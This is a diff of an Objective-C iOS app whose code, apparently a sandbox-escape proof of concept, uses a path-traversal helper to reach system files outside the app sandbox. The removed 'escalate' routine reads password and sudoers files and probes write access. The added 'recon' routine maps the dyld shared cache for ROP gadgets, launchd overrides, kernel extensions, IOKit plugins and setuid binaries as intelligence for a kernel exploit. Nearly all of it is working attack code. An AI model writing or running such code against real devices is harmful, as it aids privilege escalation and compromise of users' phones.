@@ -14,14 +14,14 @@
     UIViewController *vc = [[UIViewController alloc] init];
     self.logView = [[UITextView alloc] initWithFrame:self.window.bounds];
     self.logView.editable = NO;
-    self.logView.text = @"Root Escalation\n\n";
+    self.logView.text = @"Kernel Reconnaissance\n\n";
     vc.view = self.logView;
     
     self.window.rootViewController = vc;
     [self.window makeKeyAndVisible];
     
     dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(1.0 * NSEC_PER_SEC)), dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0), ^{
-        [self escalate];
+        [self recon];
     });
     
     return YES;
@@ -39,112 +39,103 @@
     return [home stringByAppendingPathComponent:traversal];
 }
 
-- (void)escalate {
-    [self log:@"[1] Reading sensitive files...\n"];
+- (void)recon {
+    [self log:@"[1] Gathering kernel exploit intelligence...\n"];
     
     NSFileManager *fm = [NSFileManager defaultManager];
     
-    // 1. Read password files
-    NSArray *sensitiveFiles = @[
-        @"/etc/passwd",
-        @"/etc/master.passwd",
-        @"/etc/group",
-        @"/etc/sudoers",
-        @"/private/etc/passwd",
-        @"/private/etc/master.passwd",
+    // 1. Find dyld shared cache (ROP gadgets)
+    NSArray *dyldPaths = @[
+        @"/System/Library/Caches/com.apple.dyld/dyld_shared_cache_arm64e",
+        @"/System/Library/Caches/com.apple.dyld/dyld_shared_cache_arm64",
+        @"/private/var/db/dyld/dyld_shared_cache_arm64e",
     ];
     
-    for (NSString *file in sensitiveFiles) {
-        NSString *path = [self traverse:file];
-        NSData *data = [fm contentsAtPath:path];
-        if (data) {
-            NSString *content = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];
-            NSString *msg = [NSString stringWithFormat:@"*** %@ (%lu bytes):\n%@\n", file, (unsigned long)data.length, content];
-            [self log:msg];
-        } else {
-            NSString *msg = [NSString stringWithFormat:@"[-] %@ not accessible", file];
+    [self log:@"[2] Looking for dyld shared cache..."];
+    for (NSString *path in dyldPaths) {
+        NSString *fullPath = [self traverse:path];
+        NSDictionary *attrs = [fm attributesOfItemAtPath:fullPath error:nil];
+        if (attrs) {
+            NSString *msg = [NSString stringWithFormat:@"*** FOUND: %@ (%llu bytes)", path, [attrs fileSize]];
             [self log:msg];
         }
         usleep(50000);
     }
     
-    [self log:@"\n[2] Checking write access...\n"];
-    
-    // 2. Test write access to temp directories
-    NSArray *writeTests = @[
-        @"/tmp/test_write",
-        @"/var/tmp/test_write",
-        @"/private/tmp/test_write",
-        @"/var/mobile/test_write",
-    ];
-    
-    for (NSString *testPath in writeTests) {
-        NSString *path = [self traverse:testPath];
-        NSString *testContent = @"test123";
-        NSError *error = nil;
-        BOOL success = [testContent writeToFile:path atomically:YES encoding:NSUTF8StringEncoding error:&error];
-        if (success) {
-            NSString *msg = [NSString stringWithFormat:@"*** WRITE SUCCESS: %@", testPath];
-            [self log:msg];
-            // Clean up
-            [fm removeItemAtPath:path error:nil];
-        } else {
-            NSString *msg = [NSString stringWithFormat:@"[-] WRITE FAILED: %@ - %@", testPath, error.localizedDescription];
-            [self log:msg];
-        }
-        usleep(50000);
-    }
-    
-    [self log:@"\n[3] Looking for setuid binaries...\n"];
-    
-    // 3. Find setuid binaries
-    NSArray *suidPaths = @[
-        @"/usr/bin/passwd",
-        @"/usr/bin/sudo",
-        @"/bin/su",
-        @"/usr/bin/chsh",
-        @"/usr/bin/chfn",
-        @"/usr/bin/newgrp",
-        @"/usr/sbin/traceroute",
-        @"/usr/sbin/ping",
-    ];
-    
-    for (NSString *suid in suidPaths) {
-        NSString *path = [self traverse:suid];
-        BOOL exists = [fm fileExistsAtPath:path];
-        if (exists) {
-            NSDictionary *attrs = [fm attributesOfItemAtPath:path error:nil];
-            if (attrs) {
-                NSNumber *owner = attrs[NSFileOwnerAccountID];
-                NSNumber *perms = attrs[NSFilePosixPermissions];
-                NSString *msg = [NSString stringWithFormat:@"*** %@ owner=%@ perms=%@", suid, owner, perms];
+    // 2. Find launchd overrides (disabled services)
+    [self log:@"\n[3] Reading launchd overrides..."];
+    NSString *overridesPath = [self traverse:@"/private/var/db/launchd.db/com.apple.launchd/overrides.plist"];
+    NSData *overridesData = [fm contentsAtPath:overridesPath];
+    if (overridesData) {
+        NSDictionary *overrides = [NSPropertyListSerialization propertyListWithData:overridesData options:0 format:nil error:nil];
+        if (overrides) {
+            for (NSString *key in overrides) {
+                NSString *msg = [NSString stringWithFormat:@"  Service: %@ = %@", key, overrides[key]];
                 [self log:msg];
             }
         }
-        usleep(50000);
+    } else {
+        [self log:@"  overrides.plist not accessible"];
     }
     
-    [self log:@"\n[4] Checking launchd configs...\n"];
+    // 3. Find kernel extensions
+    [self log:@"\n[4] Enumerating kernel extensions..."];
+    NSString *kextPath = [self traverse:@"/System/Library/Extensions"];
+    NSArray *kexts = [fm contentsOfDirectoryAtPath:kextPath error:nil];
+    if (kexts) {
+        for (NSString *kext in kexts) {
+            if ([kext hasSuffix:@".kext"]) {
+                NSString *msg = [NSString stringWithFormat:@"  KEXT: %@", kext];
+                [self log:msg];
+            }
+        }
+    } else {
+        [self log:@"  Extensions directory not accessible"];
+    }
     
-    // 4. Read launchd configs
-    NSArray *launchdPaths = @[
-        @"/Library/LaunchDaemons/com.apple.springboard.plist",
-        @"/Library/LaunchDaemons/com.apple.backboardd.plist",
-        @"/System/Library/LaunchDaemons/com.apple.launchd.plist",
-        @"/private/var/db/launchd.db/com.apple.launchd/overrides.plist",
-    ];
-    
-    for (NSString *launchd in launchdPaths) {
-        NSString *path = [self traverse:launchd];
-        NSData *data = [fm contentsAtPath:path];
-        if (data) {
-            NSString *msg = [NSString stringWithFormat:@"*** %@ (%lu bytes)", launchd, (unsigned long)data.length];
+    // 4. Find vulnerable drivers (IOKit families)
+    [self log:@"\n[5] Checking IOKit personalities..."];
+    NSString *iokitPath = [self traverse:@"/System/Library/Extensions/IOKit.kext/Contents/PlugIns"];
+    NSArray *iokitPlugins = [fm contentsOfDirectoryAtPath:iokitPath error:nil];
+    if (iokitPlugins) {
+        for (NSString *plugin in iokitPlugins) {
+            NSString *msg = [NSString stringWithFormat:@"  IOKit: %@", plugin];
             [self log:msg];
         }
-        usleep(50000);
     }
     
-    [self log:@"\n[5] Done"];
+    // 5. Read system version
+    [self log:@"\n[6] System info..."];
+    NSString *versionPath = [self traverse:@"/System/Library/CoreServices/SystemVersion.plist"];
+    NSData *versionData = [fm contentsAtPath:versionPath];
+    if (versionData) {
+        NSDictionary *version = [NSPropertyListSerialization propertyListWithData:versionData options:0 format:nil error:nil];
+        if (version) {
+            NSString *msg = [NSString stringWithFormat:@"  Product: %@ %@ (%@)", 
+                version[@"ProductName"], version[@"ProductVersion"], version[@"ProductBuildVersion"]];
+            [self log:msg];
+        }
+    }
+    
+    // 6. Find setuid binaries in /usr/libexec
+    [self log:@"\n[7] Scanning /usr/libexec for setuid binaries..."];
+    NSString *libexecPath = [self traverse:@"/usr/libexec"];
+    NSArray *libexecContents = [fm contentsOfDirectoryAtPath:libexecPath error:nil];
+    if (libexecContents) {
+        for (NSString *item in libexecContents) {
+            NSString *fullPath = [libexecPath stringByAppendingPathComponent:item];
+            NSDictionary *attrs = [fm attributesOfItemAtPath:fullPath error:nil];
+            if (attrs) {
+                NSNumber *perms = attrs[NSFilePosixPermissions];
+                if (perms && ([perms intValue] & 04000)) { // S_ISUID
+                    NSString *msg = [NSString stringWithFormat:@"*** SETUID: %@ (perms: %o)", item, [perms intValue]];
+                    [self log:msg];
+                }
+            }
+        }
+    }
+    
+    [self log:@"\n[8] Recon complete"];
 }
 
 @end
